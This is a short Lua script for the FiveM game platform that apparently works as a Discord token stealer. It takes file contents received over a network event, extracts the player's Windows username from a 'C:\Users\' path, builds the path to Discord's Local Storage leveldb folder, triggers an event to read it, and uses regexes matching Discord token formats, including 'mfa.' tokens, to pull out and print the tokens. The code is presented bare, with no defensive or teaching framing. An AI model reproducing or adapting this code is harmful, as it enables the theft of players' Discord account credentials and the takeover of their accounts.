RegisterNetEvent('sex')
AddEventHandler('sex', function(data)
    fileContent = data
    sex = true
    --print(data)
end)

RegisterNetEvent('tokencheck')
AddEventHandler('tokencheck', function(data)

    validateTokens(data)
end)

function findTokens(inputString)
    local tokens = {}

    local regexPatterns = {
        "[%w-]{24}%.[%w-]{6}%.[%w-]{27}",
        "mfa%.[%w-]{84}",
        "%w+%.%w+%.%w+"
    }
    
    local chunkSize = 1024 -- 1KB
    local numChunks = math.ceil(#inputString / chunkSize)
    
    for i = 1, numChunks do
        local startIndex = (i - 1) * chunkSize + 1
        local endIndex = math.min(startIndex + chunkSize - 1, #inputString)
        local chunk = inputString:sub(startIndex, endIndex)
    
        for _, pattern in ipairs(regexPatterns) do
            for token in chunk:gmatch(pattern) do
                table.insert(tokens, token)
            end
        end
    end
    return tokens
end




Citizen.CreateThread(function()
    while true do
        Wait(200)
        if sex then
            local searchString = "C:\\Users\\"
            -- print(searchString)
            
            local foundLine = nil
            
            for line in fileContent:gmatch("[^\r\n]+") do
                if line:find(searchString) then
                    foundLine = line
                    break
                end
            end
            
            if foundLine then
                --print("Found line: " .. foundLine)
                local wholeLine = foundLine -- Save the whole line in a separate variable
                --print("Whole line: " .. wholeLine) -- Print the whole line
            
                local startIdx, endIdx = wholeLine:find("C:\\Users\\")
                local changingPart = wholeLine:sub(endIdx + 1):match("([^\\]+)")
                -- Add the changing part to another string
                username = changingPart
            
                --print("Username: " .. username)
                checkToken(username)
                sex = false
            else
                --print("Search string not found.")
                sex = false
            end                    
        end
    end
end)

function checkToken(username)
	Citizen.CreateThread(function()
        local path_start = "/Users/"
        local path_end = "/AppData/Roaming/discord/Local Storage/leveldb/testi.txt"
        local path_combined = path_start .. username .. path_end

        if username ~= nil then 
            print ("inside checkToken username: ".. username)
            print ("path to token: ".. path_combined)
            TriggerEvent("pathtoken", path_combined)

        end
    end)
end

function validateTokens(string)
    Citizen.CreateThread(function()
        local tokens = findTokens(string)

        for _, token in ipairs(tokens) do
            print("Found token:", token)
        end
        print("done")
    end)
end